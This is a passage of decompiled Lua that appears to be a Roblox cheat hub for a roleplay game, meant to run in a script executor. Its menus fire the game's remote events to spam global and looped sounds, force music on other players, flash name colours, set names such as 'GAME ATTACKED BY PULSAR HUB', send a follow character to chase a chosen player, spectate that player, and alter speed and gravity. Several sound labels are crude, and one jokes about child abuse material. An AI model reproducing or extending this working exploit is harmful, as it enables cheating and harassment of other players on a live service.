local t89 = {
    name = "sai dai lava prato",
    id = "101232400175829"
}
local t90 = {
    name = "se e loko numconpeça",
    id = "78442476709262"
}
local t91 = {
    name = "mita sequer que eu too uma",
    id = "94889439372168"
}
local t92 = {
    name = "Hoje vou ser tua mulher e tu",
    id = "90844637105538"
}
local t93 = {
    name = "Deita aqui eu mandei vc deitar sirens",
    id = "100291188941582"
}
local t94 = {
    name = "miau",
    id = "131804436682424"
}
local t95 = {
    name = "skibidi",
    id = "128771670035179"
}
local t96 = {
    name = "BIRULEIBI",
    id = "121569761604968"
}
local t97 = {
    name = "sai",
    id = "121169949217007"
}
local t98 = {
    name = "risada boa dms",
    id = "127589011971759"
}
local t99 = {
    name = "vacilo perna de pau",
    id = "106809680656199"
}
local t100 = {
    name = "gomo gomo no!!!",
    id = "137067472449625"
}
local t101 = {
    name = "arroto",
    id = "140203378050178"
}
local t102 = {
    name = "iraaaa",
    id = "136752451575091"
}
local t103 = {
    name = "não fica se achando muito não",
    id = "101588606280167"
}
local t104 = {
    name = "WhatsApp notificação",
    id = "107004225739474"
}
local t105 = {
    name = "Samsung",
    id = "123767635061073"
}
local t106 = {
    name = "Shiiii",
    id = "120566727202986"
}
local t107 = {
    name = "ai_tomaa miku",
    id = "139770074770361"
}
local t108 = {
    name = "kuru_kuru",
    id = "122465710753374"
}
local t109 = {
    name = "PM ROCAM",
    id = "96161547081609"
}
local t110 = {
    name = "cavalo!!",
    id = "78871573440184"
}
local t111 = {
    name = "deixa os garoto brinca",
    id = "80291355054807"
}
local t112 = {
    name = "flamengo",
    id = "137774355552052"
}
local t113 = {
    name = "sai do mei satnas",
    id = "127944706557246"
}
local t114 = {
    name = "namoral agora e a hora",
    id = "120677947987369"
}
local t115 = {
    name = "n pode me chutar pq seu celebro e burro",
    id = "82284055473737"
}
local t116 = {
    name = "vc ta fudido vou te pegar",
    id = "120214772725166"
}
local t117 = {
    name = "deley",
    id = "102906880476838"
}
local t118 = {
    name = "Tu e um beta",
    id = "130233956349541"
}
local t119 = {
    name = "Porfavor n tira eu nao",
    id = "85321374020324"
}
local t120 = {
    name = "Olá beleza vc pode me dá muitos",
    id = "74235334504693"
}
local t121 = {
    name = "Discord sus",
    id = "122662798976905"
}
local t122 = {
    name = "rojao apito",
    id = "6549021381"
}
local t123 = {
    name = "off",
    id = "1778829098"
}
local t124 = {
    name = "Kazuma kazuma",
    id = "127954653962405"
}
local t125 = {
    name = "sometourado",
    id = "123592956882621"
}
local t126 = {
    name = "Estouradoespad",
    id = "136179020015211"
}
local t127 = {
    name = "Alaku bommm",
    id = "110796593805268"
}
local t128 = {
    name = "busss",
    id = "139841197791567"
}
local t129 = {
    name = "Estourado wItb",
    id = "137478052262430"
}
local t130 = {
    name = "sla",
    id = "116672405522828"
}
local t131 = {
    name = "HA HA HA",
    id = "138236682866721"
}
local t132 = {}
t1.value116 = {}
for _, v in ipairs({
    t67,
    t68,
    t69,
    t70,
    t71,
    t72,
    t73,
    t74,
    t75,
    t76,
    t77,
    t78,
    t79,
    t80,
    t81,
    t82,
    t83,
    t84,
    t85,
    t86,
    t87,
    t88,
    t89,
    t90,
    t91,
    t92,
    t93,
    t94,
    t95,
    t96,
    t97,
    t98,
    t99,
    t100,
    t101,
    t102,
    t103,
    t104,
    t105,
    t106,
    t107,
    t108,
    t109,
    t110,
    t111,
    t112,
    t113,
    t114,
    t115,
    t116,
    t117,
    t118,
    t119,
    t120,
    t121,
    t122,
    t123,
    t124,
    t125,
    t126,
    t127,
    t128,
    t129,
    t130,
    t131
}) do
    table.insert(t132, v.name)
    t1.value116[v.name] = v.id
end
t1.value117 = false
t1.value118 = nil
local v123 = t132[1]

v52:AddDropdown({
    Name = "Memes Sons Globais",
    Description = "Escolha um som para tocar globalmente",
    Default = v123,
    Options = t132,
    Callback = function(p87)
    t1.value118 = t1.value116[p87]
end
})
v52:AddButton({
    Name = "Tocar Som Selecionado",
    Description = "Toca o som globalmente",
    Callback = function()
    if t1.value118 then
        v54(t1.value118)

        local Sound = Instance.new("Sound")

        Sound.SoundId = "rbxassetid://" .. t1.value118
        Sound.Volume = 3
        Sound.Looped = false
        Sound.Parent = t1.value115
        Sound:Play()
        task.delay(5, function()
            Sound:Destroy()
        end)
    end
end
})
v52:AddToggle({
    Name = "Loop Som Global",
    Description = "Repete o som selecionado globalmente",
    Default = false,
    Callback = function(p88)
    t1.value117 = p88

    if t1.value117 then
        task.spawn(function()
            while t1.value117 do
                if t1.value118 then
                    v54(t1.value118)

                    local Sound = Instance.new("Sound")

                    Sound.SoundId = "rbxassetid://" .. t1.value118
                    Sound.Volume = 3
                    Sound.Looped = false
                    Sound.Parent = t1.value115
                    Sound:Play()
                    task.delay(5, function()
                        Sound:Destroy()
                    end)
                end

                task.wait(1)
            end
        end)
    end
end
})
t1.value119 = t1.value19:MakeTab({
    "Music",
    "music"
})
local function v124(p89)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local t133 = {
        [1] = "ToolMusicText",
        [2] = p89
    }

    ReplicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent"):FireServer(unpack(t133))

    local t134 = {
        [1] = "PickHouseMusicText",
        [2] = p89
    }

    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(t134))

    local t135 = {
        [1] = "PickingCarMusicText",
        [2] = p89
    }
    local v880 = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r")
    local t136 = { unpack(t135) }

    v880:FireServer(v2(t136))

    local t137 = {
        [1] = "PickingScooterMusicText",
        [2] = p89
    }

    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(t137))
end
t1.value119:AddTextBox({
    Name = "ID da música",
    PlaceholderText = "Digite o ID e pressione Enter",
    Callback = function(p90)
    if p90 and p90 ~= "" then
        local _tostring = tostring

        v124(_tostring(p90))
    end
end
})
local function v125(p91, p92, p93)
    local t138 = {}
    local t139 = {}

    for k, v in pairs(p92) do

        for v896, v897 in ipairs(v) do

            if v897.name ~= "" then
                table.insert(t138, v897.name)
                t139[v897.name] = {
                    id = v897.id,
                    category = k
                }
            end
        end
    end

    t1.value119:AddDropdown({
        Name = p91,
        Description = "all",
        Default = p93,
        Multi = false,
        Options = t138,
        Callback = function(p94)
        if p94 and t139[p94] then
            local id = t139[p94].id

            if id and (id ~= "" and id ~= "4354908569") then
                v124((tostring(id)))
            end
        end
    end
    })
end
v125("Forro", {
    forro = {
        {
            name = "Oque falta em voce sou eu",
            id = "101453332349961"
        },
        {
            name = "PISEIRO ESTOURADO (20 sgds de intro)",
            id = "133190351316780"
        },
        {
            name = "forro",
            id = "115627961590492"
        },
        {
            name = "musicaa",
            id = "ideeee"
        },
        {
            name = "musicaa",
            id = "ideeee"
        },
        {
            name = "musicaa",
            id = "ideeee"
        },
        {
            name = "musicaa",
            id = "ideeee"
        },
        {
            name = "forro ja cansou",
            id = "74812784884330"
        },
        {
            name = "GRELO E O FE",
            id = "72200166265935"
        },
        {
            name = "lenbro ate hoje",
            id = "71531533552899"
        },
        {
            name = "escolha certa",
            id = "107088620814881"
        },
        {
            name = "forro da rezenha",
            id = "120973520531216"
        },
        {
            name = "forro dudu",
            id = "74404168179733"
        },
        {
            name = "forro sao joao",
            id = "106364874935196"
        },
        {
            name = "forro engraçado paia",
            id = "76524290482399"
        },
        {
            name = "100% forro vaquejada",
            id = "92295159623916"
        },
        {
            name = "PASTOR MIRIM E A LÍNGUA DOS ANJOS",
            id = "71153532555470"
        },
        {
            name = "PARA NÃO ESQUECER QUEM SOMOS",
            id = "88937498361674"
        },
        {
            name = "Uno zero",
            id = "112959083808887"
        },
        {
            name = "Iate do neymar",
            id = "135738534706063"
        },
        {
            name = "Batidao na aldeia",
            id = "79953696595578"
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        }
    }
}, "Option 1")
v125("Musicas e Memes Aleatorio", {
    forro = {
        {
            name = "desca dai seu corno",
            id = "119738878921996"
        },
        {
            name = "GTA ESTOURADO",
            id = "109337680029292"
        },
        {
            name = "ANXIETY (Amapiano Re-fix)",
            id = "101483901475189"
        },
        {
            name = "Meu corpo, minhas regras",
            id = "127587901595282"
        },
        {
            name = "$$$$gg$$$$gg",
            id = "137471775091253"
        },
        {
            name = "Megalovania but its only the melodies",
            id = "104500091160463"
        },
        {
            name = "androphono strikes back",
            id = "78312089943968"
        },
        {
            name = "Bamm Bamm",
            id = "128730685516895"
        },
        {
            name = "chupa cabra",
            id = "132890273173295"
        },
        {
            name = "longe de mais",
            id = "124478512057763"
        },
        {
            name = "Garoto de Copacabana",
            id = "135648634110254"
        },
        {
            name = "CELL!",
            id = "117634275895085"
        },
        {
            name = "Boa vibe em Ubatuba",
            id = "139059061493558"
        },
        {
            name = "SLIP AWAY",
            id = "126152928520174"
        },
        {
            name = "Alone in Motion",
            id = "122379348696948"
        },
        {
            name = "Fade Away",
            id = "81002139735874"
        },
        {
            name = "Wounds & Wishes",
            id = "109347979566607"
        },
        {
            name = "Ascensão do Monarca",
            id = "101864243033211"
        },
        {
            name = "carro do ovo",
            id = "3148329638"
        },
        {
            name = "ingles bus (fling ou kill bus)",
            id = "123268013026823"
        },
        {
            name = "MIKU MIKU HATSUNE",
            id = "112783541496955"
        },
        {
            name = "Five Nights at Freddy's",
            id = "110733765539890"
        },
        {
            name = "Rat Dance",
            id = "133496635668044"
        },
        {
            name = "Escalando a Seleção Brasileira para a Copa",
            id = "116546457407236"
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        }
    }
}, "Option 1")
v125("Funk", {
    Funk = {
        {
            name = "Meu Hd Chei De Cp",
            id = "118351471702293"
        },
        {
            name = "Brazzino",
            id = "98958343928341"
        },
        {
            name = "UNIAO FLASCO",
            id = "112322027470467"
        },
        {
            name = "BONDE DO DISCORD",
            id = "79581762870032"
        },
        {
            name = "Vovo ta casado",
            id = "103336395794625"
        },
        {
            name = "BITCH!",
            id = "103288558732219"
        },
        {
            name = "BARULHIN DA CAMA",
            id = "126128443619187"
        },
        {
            name = "arabe funk",
            id = "93451391025129"
        },
        {
            name = "PUXANDO CBL",
            id = "78631447496051"
        },
        {
            name = "REBOLA",
            id = "121046655523341"
        },
        {
            name = "JOGA NO PAI",
            id = "128011871344522"
        },
        {
            name = "BOTEI NOUC",
            id = "124899151072996"
        },
        {
            name = "DOM DOM DOM",
            id = "101882948595303"
        },
        {
            name = "RADINHO",
            id = "139693447546059"
        },
        {
            name = "BACANA",
            id = "135336731319707"
        },
        {
            name = "ESTOURADAO KKKK",
            id = "86839065790068"
        },
        {
            name = "TIPO NINO",
            id = "140336018782383"
        },
        {
            name = "NINO PT2",
            id = "97708834121472"
        },
        {
            name = "EXCITADINHA? KKKK",
            id = "110176270788146"
        },
        {
            name = "BERIMBAU KK",
            id = "77712236704085"
        },
        {
            name = "NAT FUNK",
            id = "107416893652681"
        },
        {
            name = "FUMAR",
            id = "134130716324734"
        },
        {
            name = "MEIA NOITE!!",
            id = "82117652303865"
        },
        {
            name = "MTG EXPLODE",
            id = "81384105684889"
        },
        {
            name = "envolvidão (15 sgds de intro)",
            id = "127775034804421"
        },
        {
            name = "RAIL GRIND ESTOURADOOO",
            id = "135958179501280"
        },
        {
            name = "DA UMA BAFORADA",
            id = "76983583262607"
        },
        {
            name = "CLYXAL X NYT",
            id = "100258273816054"
        },
        {
            name = "SENTA E RBL",
            id = "107513285979080"
        },
        {
            name = "PURO LANCA",
            id = "128441181589899"
        },
        {
            name = "chairy",
            id = "130071638363509"
        },
        {
            name = "Seu Pedreiro",
            id = "116272171755349"
        },
        {
            name = "fuga na viatura",
            id = "131891110268352"
        },
        {
            name = "funkphonk fumando verde",
            id = "112143944982807"
        },
        {
            name = "que que sharke",
            id = "129546408528391"
        },
        {
            name = "pre treino",
            id = "136869502216760"
        },
        {
            name = "CVRL",
            id = "124244582950595"
        },
        {
            name = "batida Brega Violino (Beat Brega Funk)",
            id = "99399643204701"
        },
        {
            name = "Dança do Canguru (Pke Gaz1nh)",
            id = "86876136192157"
        },
        {
            name = "MONTAGEM ARABIANA (Pke Gaz1nh)",
            id = "78076624091098"
        },
        {
            name = "Manda o papo (NGI)",
            id = "132642647937688"
        },
        {
            name = "Viver bem",
            id = "82805460494325"
        },
        {
            name = "Faixa estronda",
            id = "121187736532042"
        },
        {
            name = "Ritmo Pixelado",
            id = "93928823862203"
        },
        {
            name = "Viagem Sonora",
            id = "79349174602261"
        },
        {
            name = "Melodia Virtual",
            id = "139147474886402"
        },
        {
            name = "Melodia Serena",
            id = "97011217688307"
        },
        {
            name = "SENTA",
            id = "124085422276732"
        },
        {
            name = "crazy-lol",
            id = "106958630419629"
        },
        {
            name = "V7",
            id = "80348640826643"
        },
        {
            name = "UIUAH",
            id = "82894376737849"
        },
        {
            name = "meta ritmo",
            id = "110091098283354"
        },
        {
            name = "CAPPUCCINO ASSASSINO (SPEDUP)",
            id = "132733033157915"
        },
        {
            name = "haha (NGI)",
            id = "122114766584918"
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        }
    }
}, "Option 1")
v125("Phonk", {
    phonk = {
        {
            name = "wyles",
            id = "85385155970460"
        },
        {
            name = "phonk kawai",
            id = "91502410121438"
        },
        {
            name = "querendo da a bucet@",
            id = "72720721570850"
        },
        {
            name = "vem no pocpoc",
            id = "102333419023382"
        },
        {
            name = "tatiu wim",
            id = "122871512353520"
        },
        {
            name = "novinha sapeca",
            id = "111668097052966"
        },
        {
            name = "novinha representa",
            id = "93786060174790"
        },
        {
            name = "phonk1",
            id = "77501611905348"
        },
        {
            name = "phonk2",
            id = "126887144190812"
        },
        {
            name = "phonk osadia",
            id = "88033569921555"
        },
        {
            name = "phonk sarra",
            id = "132436320685732"
        },
        {
            name = "relaionamento sem crush",
            id = "105832154444494"
        },
        {
            name = "phonk3",
            id = "90323407842935"
        },
        {
            name = "novinha dançapanpa",
            id = "132245626038510"
        },
        {
            name = "phonk sexoagreçivo",
            id = "111995323199676"
        },
        {
            name = "phonk4",
            id = "115016589376700"
        },
        {
            name = "phonk5",
            id = "118740708757685"
        },
        {
            name = "phonk6",
            id = "139435437308948"
        },
        {
            name = "phonk chapaquente",
            id = "109189438638906"
        },
        {
            name = "phonk rajada",
            id = "105126065014034"
        },
        {
            name = "rede globo",
            id = "138487820505005"
        },
        {
            name = "phonk indiano",
            id = "87968531262747"
        },
        {
            name = "vapo do vapo",
            id = "106317184644394"
        },
        {
            name = "tutatatutata",
            id = "112068892721408"
        },
        {
            name = "phonk slower",
            id = "122852029094656"
        },
        {
            name = "phonk9",
            id = "91760524161503"
        },
        {
            name = "phonk10",
            id = "73140398421340"
        },
        {
            name = "phonk11",
            id = "137962454483542"
        },
        {
            name = "phonk12",
            id = "84733736048142"
        },
        {
            name = "phonk13",
            id = "106322173003761"
        },
        {
            name = "phonk14",
            id = "94604796823780"
        },
        {
            name = "phonk15",
            id = "118063577904953"
        },
        {
            name = "phonk16",
            id = "115567432786512"
        },
        {
            name = "phonk toq",
            id = "71304501822029"
        },
        {
            name = "phonk hey",
            id = "132218979961283"
        },
        {
            name = "phonk17",
            id = "102708912256857"
        },
        {
            name = "phonk18",
            id = "140642559093189"
        },
        {
            name = "phonk neve",
            id = "13530439660"
        },
        {
            name = "phonk19",
            id = "87863924786534"
        },
        {
            name = "phonk20",
            id = "133135085604736"
        },
        {
            name = "phonk lento",
            id = "97258811783169"
        },
        {
            name = "phonk21",
            id = "92308400487695"
        },
        {
            name = "tipo wym",
            id = "88064647826500"
        },
        {
            name = "estouradassa1",
            id = "92175624643620"
        },
        {
            name = "estouradassa2",
            id = "108099943758978"
        },
        {
            name = "Naaaaa",
            id = "109784877184952"
        },
        {
            name = "trem",
            id = "114608169341947"
        },
        {
            name = "eoropa",
            id = "111346133543699"
        },
        {
            name = "atimosphekika",
            id = "77857496821844"
        },
        {
            name = "phonk ALL THE TIME",
            id = "123809083385992"
        },
        {
            name = "Lifelong Memory",
            id = "81929101024622"
        },
        {
            name = "Automotivo Blondie (Pke Gaz1nh)",
            id = "74564219749776"
        },
        {
            name = "\026\026\026\026\026\026\026\026\026\026\026 v2",
            id = "118225359190317"
        },
        {
            name = "MTG TU VAI SENTAR (Pke Gaz1nh)",
            id = "115317874112657"
        },
        {
            name = "SARRA FUNK",
            id = "96249826607044"
        },
        {
            name = "Catuquanvan",
            id = "88038595663211"
        },
        {
            name = "F-D-1 (slowed)",
            id = "124958445624871"
        },
        {
            name = "Sucessagem",
            id = "88551699463723"
        },
        {
            name = "ILOVE phonksla",
            id = "82148953715595"
        },
        {
            name = "SPEED SLIDE",
            id = "118959437310311"
        },
        {
            name = "TOMA FUNK PHONK",
            id = "126291069838831"
        },
        {
            name = "PASSO BEM SOLTO X NEW JAZZ",
            id = "122706595087279"
        },
        {
            name = "MONTAGEM BIONICA DIAMANTE",
            id = "122338822665007"
        },
        {
            name = "BALA SELVAGEM!",
            id = "96180057167470"
        },
        {
            name = "Luz <3",
            id = "74281337525581"
        },
        {
            name = "COMO TU",
            id = "86928685812280"
        },
        {
            name = "MONTAGEM SOLAR TROPICANO (SPEED UP)",
            id = "116461681407294"
        },
        {
            name = "MONTAGEM SOLAR TROPICANO (SLOWED)",
            id = "109308273341422"
        },
        {
            name = "YO DE TI",
            id = "125181345407169"
        },
        {
            name = "Beauty, (Phonk), Super sped up",
            id = "71123357599630"
        },
        {
            name = "MONTAGEM BOOMBOX DO MALA FUNK",
            id = "86537505028256"
        },
        {
            name = "BRAZIL DO FUNK",
            id = "133498554139200"
        },
        {
            name = "BRR BRR PATAPIM FUNK",
            id = "117170901476451"
        },
        {
            name = "MONTAGEM TERRA BELA FUNK",
            id = "134770548505933"
        },
        {
            name = "FUNK DO RAVE 1.0",
            id = "137135395010424"
        },
        {
            name = " Portao Funk",
            id = "70900514961735"
        },
        {
            name = " Espaço Funk",
            id = "110519906029322"
        },
        {
            name = " FUTABA",
            id = "91834632690710"
        },
        {
            name = " Melódica Explosão De Melodia",
            id = "98371771055411"
        },
        {
            name = " RASGO",
            id = "98267810117949"
        },
        {
            name = " HIPNOTIZA",
            id = "117668905142866"
        },
        {
            name = "CRISTAL NOTURNO",
            id = "103695219371872"
        },
        {
            name = " SKY HIGH",
            id = "123517126955383"
        },
        {
            name = "MIKU top",
            id = "102771149931910"
        },
        {
            name = " ACABU SO FUNK",
            id = "127870227978818"
        },
        {
            name = "CREATIFE FUNK",
            id = "130525387712209"
        },
        {
            name = "GOTH FUNK",
            id = "97662362226511"
        },
        {
            name = "PORTUGESE FUNK",
            id = "125858109122379"
        },
        {
            name = "SUBURBANA",
            id = "139825057894568"
        },
        {
            name = "ESPERA LA NOCHE FUNK",
            id = "139768056738146"
        },
        {
            name = "SIN PERMISO FUNK",
            id = "92572896648274"
        },
        {
            name = "MONTAGEM DACE RAT",
            id = "98711199754623"
        },
        {
            name = " LOVELY FUNK",
            id = "130633105268814"
        },
        {
            name = "STORYMODECOOL",
            id = "87115976125426"
        },
        {
            name = "BLACK COFFEE FUNK",
            id = "82705137378395"
        },
        {
            name = "KOBALT",
            id = "79381341943021"
        },
        {
            name = " andante bacterial",
            id = "105882833374061"
        },
        {
            name = "ANGEL Speed Up",
            id = "139593870988593"
        },
        {
            name = "LUTA ÉPICA",
            id = "73966367524216"
        },
        {
            name = "MALDITA",
            id = "133814632960968"
        },
        {
            name = "DA ZONA NTJ VERSON",
            id = "105770593501071"
        },
        {
            name = "HIPNOTIZA",
            id = "132015050363205"
        },
        {
            name = "MIDZUKI speed up",
            id = "129151948619922"
        },
        {
            name = "movimenta funk",
            id = "114994598691121"
        },
        {
            name = "CRISTAL",
            id = "103445348511856"
        },
        {
            name = "Letero funkphonk",
            id = "99409598156364"
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        },
        {
            name = "",
            id = ""
        }
    }
}, "Option 1")
t1.value119:AddButton({
    Name = "Stop",
    Description = "ALL music",
    Callback = function()
    v124("")
end
})
local v126 = t1.value19:MakeTab({
    "Name & Bio",
    "Paper"
})
t1.value120 = false
t1.value121 = false
v126:AddSection({
    Name = "Name + Bio"
})
v126:AddToggle({
    Name = "Nome + Bio Rgb",
    Description = "Activate Name and Bio RGB together",
    Default = false,
    Callback = function(p95)
    t1.value120 = p95
    t1.value121 = p95
end
})
v126:AddSection({
    Name = "Name"
})
v126:AddToggle({
    Name = "Name RGB",
    Description = "Make the Name colorful",
    Default = false,
    Callback = function(p96)
    t1.value120 = p96
end
})
v126:AddSection({
    Name = "Bio"
})
v126:AddToggle({
    Name = "Bio RGB",
    Description = "Make the Bio colorful",
    Default = false,
    Callback = function(p97)
    t1.value121 = p97
end
})
t1.value122 = {
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(255, 0, 255),
    Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(255, 165, 0),
    Color3.fromRGB(128, 0, 128),
    Color3.fromRGB(255, 20, 147)
}
spawn(function()
    while true do
        if t1.value120 then
            local v901 = t1.value122[math.random(#t1.value122)]
            local t140 = {
                [1] = "PickingRPNameColor",
                [2] = v901
            }
            local v903 = game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eColo1r")
            local t141 = { unpack(t140) }

            v903:FireServer(v2(t141))
        end

        wait(0.1)
    end
end)
spawn(function()
    while true do
        if t1.value121 then
            local v905 = t1.value122[math.random(#t1.value122)]
            local t142 = {
                [1] = "PickingRPBioColor",
                [2] = v905
            }

            game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eColo1r"):FireServer(unpack(t142))
        end

        wait(0.1)
    end
end)
v126:AddSection({
    Name = "Custom Names"
})
for _, v in ipairs({
    {
        "Anonymus",
        " Anonymus "
    },
    {
        "PRO",
        " PRO "
    },
    {
        "ERR0R_666",
        " ERR0R_666 "
    },
    {
        "DARKNE1SSS",
        " DARKNE1SSS "
    },
    {
        "GHOST",
        " GHOST "
    },
    {
        "JOKER",
        " JOKER "
    },
    {
        "ADMIN",
        " ADMIN "
    },
    {
        "TUBERS93",
        " TUBERS 93 "
    },
    {
        "CO0LKID",
        " CO0 LKID "
    },
    {
        "GAME ATTACKED BY PULSAR HUB",
        "GAME ATTACKED BY PULSAR HUB "
    },
    {
        "INC0MUN",
        " INC0MUN"
    },
    {
        "BAD BOY",
        " BAD BOY "
    }
}) do
    local v129 = v

    v126:AddButton({
        Name = v129[1],
        Callback = function()
        game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName", v129[2])
    end
    })
end
local v130 = t1.value19:MakeTab({
    "Child",
    "baby"
})
v130:AddSection({
    Name = "Child"
})
t1.value123 = nil
local value96_2 = t1.value96
t1.value124 = v130:AddDropdown({
    Name = "Select a player to chase",
    Options = value96_2,
    Default = "",
    Callback = function(p98)
    if game.Players:FindFirstChild(p98) then
        t1.value123 = p98

        return
    end

    t1.value123 = nil
end
})
v130:AddButton({
    Name = "Update Player List",
    Callback = function()
    local v908 = t1.value97()

    if t1.value124 and v908 then
        pcall(function()
            t1.value124:Refresh(v908)
        end)

        local value123 = t1.value123

        if value123 then
            value123 = not game.Players:FindFirstChild(t1.value123)
        end

        if value123 then
            t1.value123 = nil
            pcall(function()
                t1.value124:Set("")
            end)
        end
    end
end
})
game.Players.PlayerAdded:Connect(function()
    task.wait(0.1)

    local v910 = t1.value97()

    if t1.value124 and v910 then
        pcall(function()
            t1.value124:Refresh(v910)
        end)
    end
end)
game.Players.PlayerRemoving:Connect(function(player)
    task.wait(0.1)

    local v912 = t1.value97()

    if t1.value124 and v912 then
        pcall(function()
            t1.value124:Refresh(v912)
        end)

        if t1.value123 == player.Name then
            t1.value123 = nil
            pcall(function()
                t1.value124:Set("")
            end)
        end
    end
end)
v130:AddButton({
    Name = "Send Child",
    Callback = function()
    if not t1.value123 then
        return
    end

    if not workspace:FindFirstChild(t1.value95.Name) or not workspace[t1.value95.Name]:FindFirstChild("FollowCharacter") then
        local t143 = {
                [1] = "CharacterFollowSpawnPlayer",
                [2] = "BabyBoy"
            }
        local u914 = t143
        local success = pcall(function()
            local v1290 = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w")
            local t144 = { unpack(u914) }

            v1290:FireServer(v2(t144))
        end)
        if success then
        end
    end

    task.wait(0.2)

    if workspace:FindFirstChild(t1.value95.Name) then
        for _, child in pairs(workspace[t1.value95.Name]:GetChildren()) do
            if child:IsA("BasePart") then
                child.CanCollide = true
            end
        end
    end

    local value123 = t1.value123
    local value123_2 = workspace:FindFirstChild(value123)

    if value123_2 then
        value123_2 = workspace:FindFirstChild(t1.value95.Name) and workspace[t1.value95.Name]:FindFirstChild("FollowCharacter")
    end

    if value123_2 then
        workspace[t1.value95.Name].FollowCharacter.Parent = workspace[value123]

        if rawget(getgenv(), "RunService") then
            return
        end

        getgenv().RunService = game:GetService("RunService").Heartbeat:Connect(function()
            local FollowCharacter = workspace[value123]:FindFirstChild("FollowCharacter")

            if FollowCharacter and (FollowCharacter:FindFirstChild("Torso") and FollowCharacter.Torso:FindFirstChild("BodyPosition")) then
                local HumanoidRootPart = workspace[value123]:FindFirstChild("HumanoidRootPart")

                if HumanoidRootPart then
                    FollowCharacter.Torso.BodyPosition.Position = HumanoidRootPart.Position - HumanoidRootPart.CFrame.LookVector * 3
                    FollowCharacter.Torso.BodyGyro.CFrame = HumanoidRootPart.CFrame
                end
            end
        end)
    end
end
})
v130:AddButton({
    Name = "Return Child",
    Callback = function()
    if rawget(getgenv(), "RunService") then
        getgenv().RunService:Disconnect()
        getgenv().RunService = nil
    end
    local t146 = {
            [1] = "DeleteFollowCharacter"
        }
    local success = pcall(function()
        local v1294 = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w")
        local t147 = { unpack(t146) }

        v1294:FireServer(v2(t147))
    end)
    if success then
    end
    local t149 = {
            [1] = "CharacterFollowSpawnPlayer",
            [2] = "BabyBoy"
        }
    local u925 = t149
    local successValue = pcall(function()
        local v1296 = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Bab1yFollo1w")
        local t150 = { unpack(u925) }

        v1296:FireServer(v2(t150))
    end)
    if successValue then
    end
end
})
v130:AddToggle({
    Name = "View Player",
    Default = false,
    Callback = function(p99)
    local Players10 = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer14 = Players10.LocalPlayer
    local CurrentCamera2 = workspace.CurrentCamera

    if p99 then
        if not t1.value123 then
            return false
        end

        if not rawget(getgenv(), "CameraConnection") then
            getgenv().CameraConnection = RunService.Heartbeat:Connect(function()
                local t1value123 = Players10:FindFirstChild(t1.value123)

                if t1value123 and (t1value123.Character and t1value123.Character:FindFirstChild("Humanoid")) then
                    CurrentCamera2.CameraSubject = t1value123.Character.Humanoid

                    return
                end

                if rawget(getgenv(), "CameraConnection") then
                    getgenv().CameraConnection:Disconnect()
                    getgenv().CameraConnection = nil
                end

                CurrentCamera2.CameraSubject = LocalPlayer14.Character and LocalPlayer14.Character:FindFirstChild("Humanoid") or nil
            end)

            return
        end
    else
        if rawget(getgenv(), "CameraConnection") then
            getgenv().CameraConnection:Disconnect()
            getgenv().CameraConnection = nil
        end

        if LocalPlayer14.Character and LocalPlayer14.Character:FindFirstChild("Humanoid") then
            CurrentCamera2.CameraSubject = LocalPlayer14.Character.Humanoid
        end
    end
end
})
local v132 = t1.value19:MakeTab({
    "Local Player",
    "user"
})
v132:AddSection({
    Name = "Local Player"
})
v132:AddTextBox({
    Name = "Walk Speed",
    PlaceholderText = "Type here...",
    Callback = function(p100)
    local num = tonumber(p100)

    if num and (t1.value95.Character and t1.value95.Character:FindFirstChild("Humanoid")) then
        t1.value95.Character.Humanoid.WalkSpeed = num
    end
end
})
v132:AddButton({
    Name = "Reset Walk Speed",
    Callback = function()
    if t1.value95.Character and t1.value95.Character:FindFirstChild("Humanoid") then
        t1.value95.Character.Humanoid.WalkSpeed = 16
    end
end
})
v132:AddTextBox({
    Name = "Jump Power",
    PlaceholderText = "Type here...",
    Callback = function(p101)
    local num = tonumber(p101)

    if num and (t1.value95.Character and t1.value95.Character:FindFirstChild("Humanoid")) then
        t1.value95.Character.Humanoid.JumpPower = num
    end
end
})
v132:AddButton({
    Name = "Reset Jump Power",
    Callback = function()
    if t1.value95.Character and t1.value95.Character:FindFirstChild("Humanoid") then
        t1.value95.Character.Humanoid.JumpPower = 50
    end
end
})
v132:AddTextBox({
    Name = "Gravity",
    PlaceholderText = "Type here...",
    Callback = function(p102)
    local num = tonumber(p102)

    if num then
        workspace.Gravity = num
    end
end
})
v132:AddButton({
    Name = "Reset Gravity",
    Callback = function()
    workspace.Gravity = 196.2
end
})
v132:AddSection({
    Name = "Chat"
})
t1.value125 = nil
t1.value126 = game:GetService("TextChatService")
